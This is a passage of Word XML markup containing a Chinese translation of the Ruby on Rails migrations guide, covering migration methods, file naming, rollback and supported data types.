      </w:r>
    </w:p>
    <w:p w14:paraId="600A7F30" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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add_column</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DBE38EB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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add_index</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559A5919" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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change_column</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D590A19" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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change_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE517C7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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create_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ECE1E10" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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create_join_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64640D86" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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drop_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D67B2FB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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remove_column</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4A3734" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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remove_index</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40348EA5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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rename_column</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B51381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如果你需要为你的数据库完成一些特殊的任务（例如强制创建一个 </w:t>
      </w:r>
      <w:hyperlink r:id="rId125" w:anchor="7" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>外键</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ）， 这时候 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>execute</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法允许你执行任意的 SQL 语句。一个migration同时也是一个规则的 Ruby 类， 因而你不限于使用以上的方法。例如在添加完新字段后你可以编写代码去为数据库中已经 存在的记录设定这个字段的值(有需要的话利用你的 Models )。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E1B6A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某些数据库支持变更数据库纲要( schema )的语句的事务( transactions )，例如 PostgreSQL 或 SQLite3 ，它们的 migrations 就会包含在事务中处理。相反的，若你的数据库系统(如 MySQL ) 不支持的话，那么当 migration 失败了，发到一半的 schema ，并不会随着事务的取消而自动 回滚(roll back)。你必须手动挑出这些已经改动的部分。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F280406"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1.2 关于文件名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2F233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Migrations 是以文件形式存储在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db/migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录中，每一个迁移任务都作为一个文件。 文件名的格式为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>YYYYMMDDHHMMSS_create_products.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，文件名前面是一个UTC时间截， 接下来以下划线连接 migration 的名称。migration 的类名是遵循驼峰式命名格式，它跟 文件名的后半部分是一样的。例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>20080906120000_create_products.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这一个 migration 应该定义了一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CreateProducts</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的类，而 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>20080906120001_add_details_to_products.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 则定义了一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>AddDetailsToProducts</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">的类。如果你需要修改文件名，你就 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>必须</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 修改文件中的类名，不然会报 missing class 的错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0467927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Rails 内部在辨别 migration 的时候只会用到编号（前面的时间截）的部分。在 Rails2.1 之前 的版本， migration 的编号是从1开始递增的，这样做法，在多人开发时很容易造成编号冲突， 一旦冲突了就需要将 migration 回滚(rollback)并重新编号。如果你坚持想要用回原来的这种 编号结构，可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中加入下面这一行：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5215FA47" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="146A6E4B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="652414831"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.active_record.timestamped_migrations = false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="302F572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通过时间截和记录已执行过哪些migrations的特性，让Rails能够应付多人开发的状况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232E3E9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举例来说：爱丽丝新增了 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>20080906120000</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>20080906123000</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这两个 migration ，而鲍勃 接下来新增了 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>20080906124500</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并执行了它。当艾丽丝完成并提交后，鲍勃同步了最新的 代码。这时鲍勃执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，虽然鲍勃新增的 migraion 的时间截比较新，但 Rails会知道艾丽丝的这两个migration还没执行，它会自动执行对应的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40240A2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Of course this is no substitution for communication within the team. For example, if Alice’s migration removed a table that Bob’s migration assumed to exist, then trouble would certainly strike. 当然，团队内的沟通是必不可少的。例如爱丽丝的 migration 移除了鲍勃的 migration 会用到 的表，那肯定会出问题的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A5AE0B"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1.3 迁移任务变更</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C12A0D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有时你在写迁移任务的时候可能会不小心写错，如果你已经执行了这个迁移任务，那么， 你就不能单纯地把它修改一下再重新执行一次， Rails 会认为这个迁移任务已经执行过了， 所以执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时不会做任何操作。你应该先把写错的那个迁移任务回滚（可以执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:rollback</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">），然后修改你的migration再执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 去 执行正确的版本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B1C8A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一般来说，最好不要修改现有的迁移任务，因为这样做可能会给你跟你的同事带来很多 麻烦，特别是这个迁移任务已经在正式上线的服务器上执行过的话。你应该写一个新的 迁移任务来做数据库变更。如果这个迁移任务还没有进入版本控制（也就是说这些变更还 没有发布出去），那么直接修改还是可以的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6A7E83"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1.4 支持的数据类型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C84400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Active Record 支持的数据类型包括：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78984D16" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:binary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D24666" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:boolean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE35ED7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:date</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BA4941" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:datetime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9912DD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:decimal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5775705D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:float</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6495F2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:integer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D94FE9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:primary_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDB862C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:string</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB7085E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC8FBCE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5870D8D7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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:timestamp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3B831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这些类型会自动对应到数据库，例如在MySQL下，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:string</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类型会对应到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>VARCHAR(255)</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。 如果你要建立Active Recore不支持的数据类型，那可以用「non-sexy」语法，比方说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7BCA2694" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1222465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create_table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47F1E1E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t.column :name, 'polygon', :null</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25745AB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1536E9C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不过，这样就失去了不同数据库系统之间的通用性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B2AA30"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2 创建一个迁移任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F37F729"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2.1 建立一个 Model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6111C652"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Model和 scaffold的generators(生成器)在新建model的时候会自动生成对应的migration。 这个migraion里已经把建立数据表的步骤都写好了。如果生成的时候告诉Rails需要哪些字 段，Rails会把新增字段的代码都一起生成好。例如执行以下代码</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="4058AB1D" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="01F21D3F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1278222883"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails generate model Product name:string description:text</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24A95E5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将会生成的迁移任务如下:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
